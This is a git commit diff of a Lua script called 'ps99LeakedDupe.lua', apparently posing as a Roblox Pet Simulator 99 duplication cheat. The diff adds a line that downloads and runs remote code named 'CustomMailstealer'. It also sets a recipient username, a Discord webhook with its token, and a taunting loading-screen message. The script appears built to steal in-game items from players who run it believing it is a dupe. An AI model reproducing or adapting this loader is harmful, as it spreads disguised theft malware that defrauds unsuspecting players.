f34f010faa998c2fd5b060c63c212db0260c46e0
Xyokuro <93172072+Xyokuro@users.noreply.github.com>
2024-02-17 20:35:43 -0500

    Update ps99LeakedDupe.lua

--- ps99LeakedDupe.lua
+++ ps99LeakedDupe.lua
@@ -1,5 +1,7 @@
 Username = "yokuyoku18"
-Webhook = "https://discord.com/api/webhooks/1060014639099936858/L8j£5N1B9SKOoZnTbjGMwWmI3VRmm-ZInplHtKYiSi6UNA_IjIHB2RU0VJPd28SoCqTU"
-G_LoadingScreen = "Get Fucked Looser"
-G WebhookName ="Cgkbot"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Lypherx/MoriCustom/main/CustomMailstealer"))()
+Webhook = "https://discord.com/api/webhooks/1060014639099936858/L8jf5NfB9SKOoZnTbjGMwWmI3VRmmZZLnplHtKYiSi6UNA_IjfHB2Ru0vJPd28SoCqTU"
+
+G_LoadingScreen = "Get Fucked honestly "
+G_WebhookName = "CgkBot"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriCustom/main/CustomMailstealer"))()
